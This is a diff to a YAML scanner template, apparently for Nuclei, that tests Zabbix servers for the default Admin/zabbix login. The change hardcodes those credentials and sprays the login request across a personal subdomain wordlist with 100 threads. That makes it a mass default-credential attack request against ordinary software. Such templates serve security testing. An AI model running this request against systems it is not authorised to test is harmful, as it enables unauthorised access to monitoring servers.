@@ -5,10 +5,9 @@ info:
   severity: critical
   tags: zabbix,default-login
 requests:
-- attack: pitchfork
+- attack: sniper
   matchers:
-  - part: header
-    type: word
+  - type: word
     words:
     - zabbix.php?action=dashboard.view
   - status:
@@ -16,20 +15,18 @@ requests:
     type: status
   matchers-condition: and
   payloads:
-    password:
-    - zabbix
-    username:
-    - Admin
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
   raw:
   - 'POST /index.php HTTP/1.1
 
-    Host: {{Hostname}}
+    Host: {{Subdomains}}
 
     Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
     X-Requested-With: XMLHttpRequest
 
 
-    name={{username}}&password={{password}}&autologin=1&enter=Sign+in
+    name=Admin&password=zabbix&autologin=1&enter=Sign+in
 
     '
+  threads: 100
